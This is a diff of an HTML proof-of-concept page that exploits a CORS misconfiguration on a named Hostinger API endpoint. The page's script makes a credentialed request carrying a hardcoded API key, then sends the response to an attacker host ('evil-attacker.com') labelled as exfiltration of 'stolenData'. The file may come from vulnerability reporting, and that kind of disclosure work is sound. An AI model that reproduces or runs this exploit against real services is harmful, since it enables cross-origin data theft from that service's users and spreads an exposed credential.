@@ -1,30 +1,27 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>Hostinger CORS Exploit PoC</title>
-  </head>
-  <body>
-    <h1>CORS Exploit Demo</h1>
-    <script>
+<head>
+  <title>Hostinger CORS Exploit PoC</title>
+</head>
+<body>
+  <h2>Stealing Hostinger API Response...</h2>
+  <script>
     fetch("https://experiment-api.hostinger.com/sdk/v2/vardata?v=0", {
       method: "GET",
-      credentials: "include",
+      credentials: "include", // send cookies if any
       headers: {
         "Authorization": "Api-Key client-cW5zRM9wiB0Wa9KqimmHzMcWGBXkKSK6"
       }
     })
-    .then(res => res.text())
+    .then(response => response.text())
     .then(data => {
-      // send the response to your server or webhook
-      fetch("https://webhook.site/your-webhook-id", {
+      // Exfiltrate to attacker's server
+      fetch("https://evil-attacker.com/log", {
         method: "POST",
-        body: data
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ stolenData: data })
       });
     });
-    </script>
-  </body>
+  </script>
+</body>
 </html>
-
-
-
-
